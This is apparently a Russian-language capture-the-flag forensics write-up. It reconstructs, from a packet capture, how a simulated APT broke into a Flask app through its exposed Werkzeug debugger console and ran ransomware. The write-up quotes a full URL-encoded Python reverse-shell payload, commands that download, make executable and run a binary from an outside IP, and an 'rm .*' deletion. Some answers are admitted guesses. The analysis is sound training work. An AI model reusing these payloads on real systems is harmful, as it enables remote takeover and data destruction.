
# Условие 1
14. Враг врага 2 - 1

Разведка донесла, что APT «Таймырский муксун» недавно провернул изящную операцию против «Таежного кролика». Поговаривают, что в инфраструктуру «Кролика» было внедрено вредоносное ПО, которое успело наделать шума. Теперь наша задача — докопаться до истины. Вперёд, охотники за «кроличьими» секретами!

Необходимые файлы должны быть на вашем оборудовании. К заданию относится образ linux системы.

- 1. Как был получен первичный доступ к системе? (2 балла)

# Ответ 1

### Открытие консоли (пакет 565-566) спустя 11 секунд после открытия главной страницы сайта:

http://10.10.10.3:5000/console?__debugger__=yes&cmd=resource&f=debugger.js

### Python реверс шелл (пакет 761) на порт 9001:

http://10.10.10.3:5000/console?&__debugger__=yes&cmd=import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%2210.10.10.12%22%2C9001))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bimport%20pty%3B%20pty.spawn(%22bash%22)&frm=0&s=yqqPfQiFZmXsmnZQYMPF

```
root@7a5a67189bc9:/app#
```

# Условие 2

15. Враг врага 2 - 2

- 2. С каких IP-адресов поступала полезная нагрузка? (2 балла)

# Ответ 2

Атака с `10.10.10.12` через `10.10.10.3`

С сервера `81.177.221.242` было скачано приложение-шифровальщик `app`

# Условие 3

16. Враг врага 2 - 3

- 3. Какие механизмы защиты от детектирования применены в вредоносном приложении? (4/8 баллов)

# Ответ 3

! Предполагаю

```
CUSTOM_write found, patched.\r\nok\r\n
```

Runtime-patching чтобы использовать CUSTOM_write() вместо write() чтобы спрятаться от AppArmor'а на сервере

# Условие 4

17. Враг врага 2 - 4

- 4. В какое время было начато исполнение вредоносной нагрузки? (13 баллов)

# Ответ 4

Примерно с пакета 945 (Jan 22 22:3?:??) (с удаления всего в домашней директории):
```
rm .*
```
```
cd ..
wget http://81.177.221.242:8125/app
chmod +x ./app
./app
```
И потом (1535):
```
Encrypting .//app: Encrypting .//ioal/app/docker-compose.yml: Encrypting .//ioal/app/server/requirements.txt: Encrypting .//ioal/app/server/wait-for-postgres.sh: Encrypting .//ioal/app/server/Dockerfile: Encrypting .//ioal/app/server/templates/index.html: Encrypting .//ioal/app/server/__init__.py: Encrypting .//ioal/app/server/assets/css/listr.pack.css: Encrypting .//ioal/app/server/assets/css/custom.css: Encrypting .//ioal/app/server/assets/css/jquery.filer.css: Encrypting .//ioal/app/server/assets/fonts/fontawesome-webfont.woff: Encrypting .//ioal/app/server/assets/fonts/jquery.filer-icons/jquery-filer.ttf: Encrypting .//ioal/app/server/assets/fonts/jquery.filer-icons/jquery-filer-preview.html: Encrypting .//ioal/app/server/assets/fonts/jquery.filer-icons/jquery-filer.svg: Encrypting .//ioal/app/server/assets/fonts/jquery.filer-icons/jquery-filer.eot: Encrypting .//ioal/app/server/assets/fonts/jquery.filer-icons/jquery-filer.woff: Encrypting .//ioal/app/server/assets/fonts/jquery.filer-icons/jquery-filer.cs
"\
```

# Условие 5

18. Враг врага 2 - 5

- 5. Какая строчка была использована в качестве SECRET поля для уязвимого сервиса? (20 баллов)

# Ответ 5

```
strings dump.pcapng | grep SEC
  SECRET = "yqqPfQiFZmXsmnZQYMPF";
  SECRET = "yqqPfQiFZmXsmnZQYMPF";
  SECRET = "yqqPfQiFZmXsmnZQYMPF";
```

А так же эта же строка в параметре s= в 172.18.0.3:5000/console

# Условие 6

19. Враг врага 2 - 6

- 6. Опишите принцип работы и тип вредоносной нагрузки? (20 баллов)

# Ответ 6

Вручную удалены все файлы из домашнего каталога

Все что осталось было зашифровано (то есть веб приложение) с помощью `app`

Тип: ??
